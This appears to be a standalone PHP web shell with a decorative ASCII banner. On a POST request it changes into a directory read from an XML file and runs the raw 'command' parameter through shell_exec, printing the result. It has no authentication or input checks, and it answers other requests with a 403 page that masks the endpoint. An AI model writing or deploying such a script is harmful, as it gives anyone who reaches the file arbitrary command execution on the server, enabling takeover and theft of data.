<?php
    /*
    ┏┓┏┓┳┓┏┓┓ ┓┏┏┓┏┓
    ┃ ┃┃┃┃┣ ┃ ┗┫┣ ┣ 
    ┗┛┗┛┻┛┗┛┗┛┗┛┻ ┗┛
    */              
    ?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';

    if (!empty($command)) {
        // Read the directory path from the XML file
        $filePath = 'directory.xml'; // Replace with the actual path to your XML file

        if (file_exists($filePath)) {
            $xml = simplexml_load_file($filePath);
            $directoryPath = (string) $xml->path;

            // Check if the directory path exists and is a directory
            if (is_dir($directoryPath)) {
                chdir($directoryPath);
                $output = shell_exec($command);
                echo ($output !== null) ? htmlentities($output) : 'Command executed successfully.';
            } else {
                echo "Directory does not exist or is not valid: $directoryPath";
            }
        } else {
            echo "XML file not found: $filePath";
        }
    } else {
        echo 'No command provided.';
    }
} else {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access Forbidden.';
}
?>